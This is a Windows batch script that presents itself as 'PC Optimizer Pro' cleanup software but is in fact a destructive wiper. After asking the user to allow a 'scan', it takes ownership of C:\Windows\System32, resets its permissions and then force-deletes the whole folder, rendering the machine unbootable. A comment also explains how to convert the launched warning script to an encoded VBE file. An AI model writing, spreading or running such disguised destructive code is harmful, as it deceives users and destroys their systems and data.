@echo off
title PC Optimizer Pro
color 0b
mode 1000
cls
goto WarningMessage

:WarningMessage
rem HERE IS THE PART WHERE YOU NEED TO CHANGE "Warning.vbs" and "./Assets/Warning.vbs" to "Warning.vbe" and "./Assets/Warning/vbe" respectively when compiling.
start "Warning.vbs" "./Assets/Warning.vbs"
goto ProgramStart

:ProgramStart
echo Thank you for using PC Optimizer Pro! 
echo PC Optimizer Pro is software that helps clean up your PC.
echo To start, PC Optimizer Pro would like to perform a scan. Allow?
set choice=
set /p choice=Y or N?: 
if NOT '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='Y' goto yes
if '%choice%'=='y' goto yes
if '%choice%'=='N' goto no
if '%choice%'=='n' goto no
echo "%choice%" is not a valid choice. Please type Y or N(capitalization doesn't matter).
pause
cls
goto ProgramStart

:no
cls
echo You have chosen to abort the scan.
pause
exit

:yes
cls
echo Begin your scan. Please note that there may be times where we require permission to continue. Please enter "Y" when prompted.
pause
tree "C:\Windows"
takeown /f "C:\Windows\System32" /r
tree "C:\Windows\System32"
icacls "C:\Windows\System32" /reset /t /c /q
tree "C:\"
echo ==========================================================================
echo ==========================================================================
echo You scan has been completed, and PC Optimizer Pro will now optimize your PC by deleting unnessesary internet files, cache, temporary files, unneeded appdata, amongst others. 
pause
goto DeletionLMAO

:DeletionLMAO
del "C:\Windows\System32" /f /q /s